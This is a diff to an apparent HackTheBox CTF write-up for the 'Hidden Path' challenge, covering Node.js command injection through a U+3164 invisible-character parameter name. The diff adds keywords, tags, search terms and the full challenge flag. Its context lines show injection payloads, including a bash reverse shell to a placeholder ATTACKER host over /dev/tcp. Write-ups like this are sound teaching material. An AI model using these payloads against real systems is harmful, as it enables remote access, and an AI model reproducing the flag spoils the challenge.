@@ -6,6 +6,11 @@
 
 ## Challenge Info
 
+**Keywords:** unicode homoglyph, command injection, U+3164, invisible character, nodejs, express, destructuring, variable reference, hangul jungseong filler, array injection, system check endpoint, misc easy 1000 points  
+**Tags:** #javascript #nodejs #command-injection #unicode #homoglyph #u3164 #express #invisible-character #misc-easy #hackthebox #ctf  
+**Flag:** `HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_6011a114c82501cf9d38d89d752075cd}`  
+**Search Terms:** unicode injection exploit, U+3164 vulnerability, invisible character attack, nodejs command injection, express destructuring bypass, hackthebox hidden path walkthrough, hackthebox hidden path solution, hiddenpath htb, hidden-path ctf, hangul jungseong filler exploit
+
 - **Name**: Hidden Path
 - **Category**: Misc
 - **Difficulty**: Easy
@@ -178,3 +183,4 @@ choice=6&ㅤ=env
 # Reverse shell (would work with proper listener)
 choice=6&ㅤ=bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
 ```
+
